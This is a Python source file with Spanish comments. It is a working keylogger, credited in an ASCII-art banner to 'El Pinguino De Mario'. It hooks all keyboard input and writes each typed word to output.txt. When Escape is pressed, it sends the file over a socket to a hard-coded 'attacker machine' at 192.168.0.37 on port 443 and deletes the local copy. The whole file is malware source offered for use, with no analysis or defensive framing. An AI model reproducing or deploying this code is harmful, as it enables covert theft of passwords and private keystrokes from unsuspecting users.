print("""
  .--.
 |o_o | 
 |:_/ | 
//   \ \ 
(\_   _/)
  \_=_/
*****************************************************
*                  Hecho por                        *
*             El Pinguino De Mario                  *
*****************************************************
""")

import keyboard
import sys
import socket
import os
from colorama import Fore, Style

# Colores de colorama:
green = Fore.GREEN
reset = Style.RESET_ALL

# Cada palabra capturada se resetea en esta variable:
palabra = ""

# Función para registrar cada palabra presionada en la variable palabra:
def pulsacion_tecla(pulsacion): # Recibir cada pulsación del teclado

    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
    
        if pulsacion.name == 'space':
            guardar_palabra_al_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable(): # Se encarga de manejar las pulsaciones de teclas que representan caracteres imprimibles.
            palabra += pulsacion.name

# Registrar la función de devolución de llamada
keyboard.hook(pulsacion_tecla) # Llamamos a la función on_key_event para pasarle cada pulsación a la variables pulsacion.

# Cada palabra se guarda en el output.txt y se crea en caso de no existir.
def guardar_palabra_al_espacio():
    
    with open("output.txt", "a") as file: # La a es de append, modo apertura del archivo para añadir información.
        file.write(palabra + "\n")
    print(f'Palabra registrada: {Fore.GREEN}{palabra}{Style.RESET_ALL}')
    resetear_palabra() # Llamamos a la función que se encarga de resetear la variable después de presionar espacio.

# Función para que se vaya registrando en la variable cada palabra al presionar espacio.
def resetear_palabra():
    global palabra
    palabra = ""

# Enviamos el output.txt a una máquina atacante que esté escuchando con netcat (después de presionar control + C).
def enviar_archivo_via_sockets(archivo, direccion_ip, puerto):
    try:
        with open(archivo, 'rb') as file:
            contenido = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((direccion_ip, puerto))
            s.sendall(contenido)
            os.remove("output.txt")
            sys.exit()

    except Exception as e:
        print(f"Error al enviar el archivo: {e}")

# Se detiene el script y ahí se llama a la función anterior.
def detener_script():
    print("Enviamos datos a la máquina atacante")
    keyboard.unhook_all()  # Desvincular todos los eventos de teclado
    enviar_archivo_via_sockets(archivo_a_enviar, direccion_ip_destino, puerto_destino)

# Donde enviamos el .txt
direccion_ip_destino = '192.168.0.37'
puerto_destino = 443
archivo_a_enviar = 'output.txt'

try:
    keyboard.wait('esc') # Bucle que debe estar en ejecución para detener el script con tecla escape.
    detener_script()
except KeyboardInterrupt:
    print(f'{Fore.GREEN}Script Detenido{Style.RESET_ALL}')
    pass
